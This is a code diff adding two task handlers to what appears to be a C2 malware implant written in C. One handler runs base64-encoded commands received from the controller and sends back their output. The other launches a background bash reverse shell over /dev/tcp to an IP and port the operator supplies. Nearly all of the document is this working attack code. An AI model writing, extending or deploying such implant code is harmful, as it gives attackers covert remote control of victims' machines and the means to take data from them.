@@ -246,3 +246,142 @@ char * mv_task(char * buffer_fetch) {
     free(decoded_new_file_path);
     return task_ID_copy;
 }
+
+// Implementation for execve_task - Execute a command
+char * execve_task(char * buffer_fetch, char * dest) {
+    /*
+    Task that executes a command on demand from the C2
+    Input format: EXECVE,task_ID,encoded_command,encoded_args
+    Output format: result in dest containing base64 encoded command output
+    */
+    char buffer[1024];
+    strcpy(buffer, buffer_fetch);
+
+    char * command = strtok(buffer, ",");
+    if (strcmp(command, "EXECVE") != 0) {
+        printf("Invalid command\n");
+        return NULL;
+    }
+
+    char * task_ID = strtok(NULL, ",");
+    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID
+
+    char * encoded_cmd = strtok(NULL, ",");
+    if (encoded_cmd == NULL) {
+        printf("Missing command\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    char * encoded_args = strtok(NULL, ",");
+    if (encoded_args == NULL) {
+        printf("Missing arguments\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    // Decode command and arguments
+    char * cmd = NULL;
+    char * args = NULL;
+    decoder_base64(encoded_cmd, &cmd);
+    decoder_base64(encoded_args, &args);
+
+    // Create full command
+    char full_command[2048];
+    snprintf(full_command, sizeof(full_command), "%s %s", cmd, args);
+    printf("Executing: %s\n", full_command);
+
+    // Execute the command and capture output
+    FILE *fp = popen(full_command, "r");
+    if (fp == NULL) {
+        perror("Failed to execute command");
+        free(cmd);
+        free(args);
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    // Read command output
+    char output[1024*1024] = {0};
+    char buffer_read[1024];
+    while (fgets(buffer_read, sizeof(buffer_read), fp) != NULL) {
+        strcat(output, buffer_read);
+    }
+    pclose(fp);
+
+    // Encode result to base64
+    char * encoded_output = NULL;
+    encoder_base64(output, &encoded_output);
+
+    // Copy encoded output to destination
+    strcpy(dest, encoded_output);
+
+    // Clean up
+    free(cmd);
+    free(args);
+    free(encoded_output);
+
+    return task_ID_copy;
+}
+
+char * revshell_task(char * buffer_fetch, char * dest) {
+    /*
+    Task that opens a reverse shell to a specified IP and port
+    Input format: REVSHELL,task_ID,encoded_port,encoded_ip
+    Output: No output is expected as this creates a new connection
+    */
+    char buffer[1024];
+    strcpy(buffer, buffer_fetch);
+
+    char * command = strtok(buffer, ",");
+    if (strcmp(command, "REVSHELL") != 0) {
+        printf("Invalid command\n");
+        return NULL;
+    }
+
+    char * task_ID = strtok(NULL, ",");
+    char * task_ID_copy = strdup(task_ID); // Create a persistent copy of task_ID
+
+    char * encoded_port = strtok(NULL, ",");
+    if (encoded_port == NULL) {
+        printf("Missing port\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    char * encoded_ip = strtok(NULL, ",");
+    if (encoded_ip == NULL) {
+        printf("Missing IP\n");
+        free(task_ID_copy);
+        return NULL;
+    }
+
+    // Decode port and IP
+    char * port = NULL;
+    char * ip = NULL;
+    decoder_base64(encoded_port, &port);
+    decoder_base64(encoded_ip, &ip);
+
+    // Create the reverse shell command
+    char shell_command[1024];
+    snprintf(shell_command, sizeof(shell_command),
+             "bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'",
+             ip, port);
+
+    printf("Launching reverse shell to %s:%s\n", ip, port);
+
+    // Execute the reverse shell command in the background
+    // We use system() instead of popen() because we don't need to capture output
+    char background_cmd[1100];
+    snprintf(background_cmd, sizeof(background_cmd), "%s &", shell_command);
+    system(background_cmd);
+
+    // No output is expected for reverse shell
+    dest[0] = '\0';
+
+    // Clean up
+    free(port);
+    free(ip);
+
+    return task_ID_copy;
+}
